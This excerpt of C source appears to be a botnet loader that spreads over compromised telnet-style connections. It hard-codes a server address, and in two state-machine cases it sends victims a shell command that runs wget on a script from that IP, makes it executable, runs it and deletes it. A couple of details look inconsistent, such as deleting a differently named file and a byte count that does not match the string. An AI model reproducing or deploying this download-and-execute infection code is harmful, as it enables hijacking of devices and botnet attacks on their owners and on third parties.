...
{
        "89.34.99.38:999" //Start the server on this port
};
...
void StartTheLelz(int maxfds)
{
        ...
        while (1)
        {
    			...
    			case 8:
    				{
    					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.38/gtop.sh; chmod 777 *; sh gtop.sh; rm -rf gtop.sh\r\n", 135, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
    					fds[i].state = 9;
    				}
    				break;
    			...
    			case 10:
    				{
    					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.99.38/gtop.sh; chmod 777 *; sh gtop.sh; rm -rf bins.sh\r\n", 135, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
    					sclose(fds[i].fd);
    					fds[i].state = 0;
    					fds[i].complete = 1;
    				}
